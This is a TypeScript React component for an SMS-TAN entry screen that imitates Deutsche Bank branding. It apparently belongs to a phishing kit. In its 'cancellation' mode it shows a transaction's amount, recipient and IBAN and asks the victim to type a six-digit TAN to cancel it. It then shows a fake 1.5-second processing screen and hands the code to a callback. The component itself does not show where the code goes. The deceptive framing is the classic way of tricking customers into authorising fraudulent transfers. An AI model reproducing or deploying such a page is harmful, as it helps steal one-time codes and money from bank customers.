import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
      />
    );
  }

  return (
    <div className="deutsche-bank-container" style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
      color: '#333333'
    }}>
      <div style={{
        maxWidth: '800px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main SMS TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '600px',
          backgroundColor: '#ffffff',
          border: '1px solid #dddddd',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Header Section */}
          <div style={{
            backgroundColor: '#f5f5f5',
            padding: isMobile ? '20px' : '30px',
            borderBottom: '1px solid #dddddd'
          }}>
            <h1 style={{
              color: '#0550d1',
              fontSize: isMobile ? '1.5rem' : '2rem',
              fontWeight: '600',
              margin: '0',
              fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
              textAlign: 'center'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#f5f5f5',
              border: '1px solid #dddddd',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#333333',
                fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                lineHeight: '1.5'
              }}>
                {tanType === 'TRANSACTION_TAN'
                  ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                  : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #0550d1',
                borderRadius: '4px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#0550d1',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '600',
                  margin: '0 0 20px 0',
                  fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                  textAlign: 'center'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #dddddd'
                  }}>
                    <span style={{
                      color: '#666666',
                      fontSize: '14px',
                      fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#0550d1',
                      fontSize: '18px',
                      fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                      fontWeight: '600'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #dddddd'
                    }}>
                      <span style={{
                        color: '#666666',
                        fontSize: '14px',
                        fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #dddddd'
                    }}>
                      <span style={{
                        color: '#666666',
                        fontSize: '14px',
                        fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#666666',
                        fontSize: '14px',
                        fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* TAN Input Section */}
            <div style={{
              backgroundColor: '#f5f5f5',
              border: '1px solid #dddddd',
              borderRadius: '4px',
              padding: '30px',
              marginBottom: '30px'
            }}>
              <h3 style={{
                color: '#0550d1',
                fontSize: isMobile ? '1.125rem' : '1.25rem',
                fontWeight: '600',
                margin: '0 0 25px 0',
                fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                textAlign: 'center'
              }}>
                {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
              </h3>

              {/* TAN Input Fields */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                gap: isMobile ? '8px' : '12px',
                marginBottom: '25px',
                flexWrap: 'wrap'
              }}>
                {tan.map((digit, index) => (
                  <input
                    key={index}
                    id={`tan-input-${index}`}
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className="deutsche-bank-input"
                    style={{
                      width: isMobile ? '40px' : '50px',
                      height: isMobile ? '50px' : '60px',
                      fontSize: isMobile ? '1.5rem' : '1.75rem',
                      textAlign: 'center',
                      border: '1px solid #dddddd',
                      borderRadius: '4px',
                      outline: 'none',
                      color: '#0550d1',
                      fontWeight: '600',
                      fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      transition: 'border-color 0.2s ease',
                      padding: '0'
                    }}
                    onFocus={(e) => {
                      (e.target as HTMLInputElement).style.borderColor = '#0550d1';
                    }}
                    onBlur={(e) => {
                      (e.target as HTMLInputElement).style.borderColor = '#dddddd';
                    }}
                    disabled={isSubmitting}
                  />
                ))}
              </div>

              {/* Submit Button */}
              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  onClick={handleSubmit}
                  disabled={tan.join('').length !== 6 || isSubmitting}
                  className="deutsche-bank-button"
                  style={{
                    backgroundColor: (tan.join('').length !== 6 || isSubmitting) ? '#dddddd' : '#0550d1',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '14px 28px',
                    fontSize: '16px',
                    fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                    fontWeight: '600',
                    cursor: (tan.join('').length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                    transition: 'background-color 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '200px'
                  }}
                  onMouseEnter={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#0440a8';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#0550d1';
                    }
                  }}
                >
                  {isSubmitting
                    ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                    : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                  }
                </button>
              </div>

              {/* Resend Button */}
              {onResend && (
                <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                  <button
                    onClick={handleResend}
                    disabled={!canResend || isSubmitting}
                    style={{
                      backgroundColor: 'transparent',
                      color: (!canResend || isSubmitting) ? '#dddddd' : '#0550d1',
                      border: `2px solid ${(!canResend || isSubmitting) ? '#dddddd' : '#0550d1'}`,
                      borderRadius: '4px',
                      padding: '12px 26px',
                      fontSize: '16px',
                      fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                      fontWeight: '600',
                      cursor: (!canResend || isSubmitting) ? 'not-allowed' : 'pointer',
                      transition: 'all 0.2s ease',
                      width: isMobile ? '100%' : 'auto',
                      minWidth: '200px'
                    }}
                    onMouseEnter={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = '#0550d1';
                        (e.target as HTMLButtonElement).style.color = '#ffffff';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                        (e.target as HTMLButtonElement).style.color = '#0550d1';
                      }
                    }}
                  >
                    TAN erneut senden {canResend ? '' : `(${countdown}s)`}
                  </button>
                </div>
              )}

              {/* Cancel Link */}
              {onCancel && (
                <div style={{ textAlign: 'center' }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      onCancel();
                    }}
                    className="deutsche-bank-link"
                    style={{
                      color: '#0550d1',
                      textDecoration: 'none',
                      fontSize: '14px',
                      fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif',
                      transition: 'color 0.2s ease'
                    }}
                    onMouseEnter={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#0440a8';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'underline';
                    }}
                    onMouseLeave={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#0550d1';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'none';
                    }}
                  >
                    {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                  </a>
                </div>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#666666',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'DeutscheBank UI, Arial, Helvetica, sans-serif'
              }}>
                Keine SMS erhalten? Überprüfen Sie Ihren Spam-Ordner oder kontaktieren Sie den Deutsche Bank Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
